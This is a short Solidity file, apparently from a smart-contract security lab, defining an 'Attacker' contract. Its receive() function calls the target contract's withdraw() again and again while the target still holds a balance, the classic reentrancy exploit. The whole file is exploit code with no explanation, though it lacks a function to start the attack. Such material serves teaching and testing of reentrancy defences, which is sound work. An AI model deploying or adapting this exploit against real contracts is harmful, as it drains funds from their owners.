// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

import "hardhat/console.sol";
import "./Main.sol";

contract Attacker {
  Main private targetContractAddress;

  constructor(Main targetContractAddressParam) {
    targetContractAddress = targetContractAddressParam;
  }

  receive() external payable {
    if (address(targetContractAddress).balance > 0) {
      targetContractAddress.withdraw();
    }
  }
}
